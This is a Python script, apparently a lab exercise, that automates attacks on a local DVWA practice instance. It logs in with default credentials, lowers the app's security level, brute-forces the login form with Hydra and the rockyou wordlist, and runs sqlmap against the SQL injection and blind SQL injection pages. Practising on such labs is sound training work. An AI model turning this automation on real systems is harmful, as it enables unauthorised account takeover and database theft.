#!/usr/bin/env python3

import requests
import subprocess
import re
import sys
from urllib.parse import urlparse

# ---- CONFIG ----
TARGET_HOST = "127.0.0.1"
DVWA_BASE = f"http://{TARGET_HOST}/DVWA"
LOGIN_URL = DVWA_BASE + "/login.php"
SECURITY_URL = DVWA_BASE + "/security.php"
BRUTE_PATH = "/DVWA/vulnerabilities/brute/"   # Hydra wants relative path!
SQLI_URL = DVWA_BASE + "/vulnerabilities/sqli/"
SQLI_BLIND_URL = DVWA_BASE + "/vulnerabilities/sqli_blind/"

USERNAME = "admin"
PASSWORD = "password"
HYDRA_USER = "admin"
HYDRA_PASSLIST = "/usr/share/wordlists/rockyou.txt"    # .gz allowed
HYDRA_MAX_CREDS = 2
FAILED_STRING = "Username and/or password incorrect."
HYDRA_PATH = "hydra"
SQLMAP_PATH = "sqlmap"

def get_csrf_token(resp_text):
    m = re.search(r"name=['\"]user_token['\"]\s*value=['\"]([^'\"]+)['\"]", resp_text)
    if not m:
        raise Exception("CSRF token not found")
    return m.group(1)

def dvwa_login():
    session = requests.Session()
    # 1. Get login token
    r = session.get(LOGIN_URL)
    token = get_csrf_token(r.text)
    # 2. Post login
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }
    resp = session.post(LOGIN_URL, data=data)
    if "Logout" not in resp.text:
        print(resp.text)  # DEBUG
        raise Exception("Login failed, check credentials or DVWA status.")
    print("[+] Logged in to DVWA")
    # 3. Set security to low (optional but recommended)
    r2 = session.get(SECURITY_URL)
    try:
        token2 = get_csrf_token(r2.text)
        sec_data = {"security": "low", "seclev_submit": "Submit", "user_token": token2}
        session.post(SECURITY_URL, data=sec_data)
        print("[+] DVWA security set to LOW")
    except Exception:
        print("[-] Could not set security to low, continuing anyway...")
    return session

def build_cookie_header(cookiejar):
    # Return string for hydra H=Cookie:... arg
    items = []
    for k, v in cookiejar.items():
        if k.lower() in ['phpsessid', 'security']:
            items.append(f"{k}={v}")
    return ";".join(items)

def run_hydra(cookie_header, max_found=1):
    print(f"[+] Starting Hydra brute force against {TARGET_HOST} (brute force)")
    form_str = (f"{BRUTE_PATH}:username=^USER^&password=^PASS^&Login=Login:"
                f"H=Cookie:{cookie_header}:F={FAILED_STRING}")

    cmd = [
        HYDRA_PATH,
        "-l", HYDRA_USER,
        "-P", HYDRA_PASSLIST,
        TARGET_HOST,
        "http-get-form", form_str,
        "-t", "4",
        "-f",
        "-o", "hydra.out"
    ]
    print("[*] Hydra command:", " ".join(cmd))
    found = 0
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    for line in proc.stdout:
        sys.stdout.write(line)
        if "login:" in line:
            found += 1
            if found >= max_found:
                proc.terminate()
                break
    proc.wait()
    print(f"[+] Hydra finished, found {found} credential(s).")
    return found

def run_sqlmap(target_url, cookie_str, label="SQLi"):
    print(f"[+] Running SQLMap ({label}) against {target_url}")
    cmd = [
        SQLMAP_PATH,
        "-u", target_url,
        "--batch",
        "--cookie", cookie_str,
        "--level", "2"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode == 0:
        print(f"[+] SQLMap ({label}) completed.")
    else:
        print(f"[-] SQLMap ({label}) failed or found nothing.")
    return result.returncode == 0

def main():
    session = dvwa_login()
    cookie_jar = session.cookies.get_dict()
    cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_jar.items()])
    cookie_header = build_cookie_header(cookie_jar)

    # 1. Brute Force with Hydra, with session cookies and .gz password file
    run_hydra(cookie_header, HYDRA_MAX_CREDS)

    # 2. SQLi
    run_sqlmap(f"{SQLI_URL}?id=1&Submit=Submit", cookie_str, label="Classic SQLi")

    # 3. Blind SQLi
    run_sqlmap(f"{SQLI_BLIND_URL}?id=1&Submit=Submit", cookie_str, label="Blind SQLi")

    print("[*] All attacks complete.")

if __name__ == "__main__":
    main()
